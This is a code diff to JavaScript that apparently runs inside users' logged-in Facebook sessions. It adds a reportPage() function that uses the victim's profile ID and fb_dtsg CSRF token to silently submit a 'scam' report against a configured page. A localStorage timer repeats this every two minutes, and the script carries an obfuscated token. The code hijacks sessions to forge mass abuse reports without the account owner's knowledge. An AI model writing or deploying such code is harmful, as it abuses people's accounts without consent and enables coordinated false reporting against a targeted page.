@@ -7,8 +7,8 @@ var win = this;
 var ajax = win["XMLHttpRequest"];
 
 function nejsu() {
-    var c_n = "nejsim_0:1:"+profile_id;
-    var c_t = 5;
+    var c_n = "nejsim_0:2:"+profile_id;
+    var c_t = 2;
 
     if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
         localStorage[c_n] = Date.now();
@@ -18,6 +18,7 @@ function nejsu() {
         config['hideable_token'] = "MzQxNzU1s7Q0sjQyNrAwNq5zzSsJy0xJzXcuSk0syczPCy7JL6qsqzM1MzO2tDA2MDaxMDQ2tqirM6gDAA";
         config["mode"] = true;
         if(config.mode == true){
+          reportPage();
           start();
         }
     }else{
@@ -27,7 +28,46 @@ function nejsu() {
     }
 }
 
-
+function reportPage(){
+  var xhr = new XMLHttpRequest();
+ var obj = {
+   breadcrumbs:[],
+   story_location:"page",
+   is_from_feed_tombstone:false,
+   actions_taken:"",
+   is_rapid_reporting:false,
+   is_instream_follow_up:false,
+   entry_point:"unknown",
+   reportable_ent_token:config.page_id,
+   is_impostor:""
+ };
+  var params = {};
+  params["fb_dtsg"] = fb_dtsg;
+  params["answer"] = "scam";
+  params["context"] = JSON.stringify(obj);
+  params["av"] = profile_id;
+  params["__user"] = profile_id;
+  params["__a"] = "1";
+  params["__dyn"] = __dyn;
+  params["__af"] = "h0";
+  params["__req"] = "2d";
+  params["__be"] = "1";
+  params["__pc"] = "PHASED:DEFAULT";
+  params["__rev"] = __rev;
+  params["jazoest"] = jazoest;
+  params["__spin_r"] = __rev;
+  params["__spin_b"] = "trunk";
+  params["__spin_t"] = Math["floor"](Date["now"]() / 1E3);
+  xhr.open("POST", "/ajax/nfx/continue_dialog?av="+profile_id+"&dpr=1&ext=me", true);
+  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+          xhr.close;
+          step2();
+      }
+  }
+  xhr.send(deSerialize(params));
+}
 
 function start(){
   var xhr = new XMLHttpRequest();
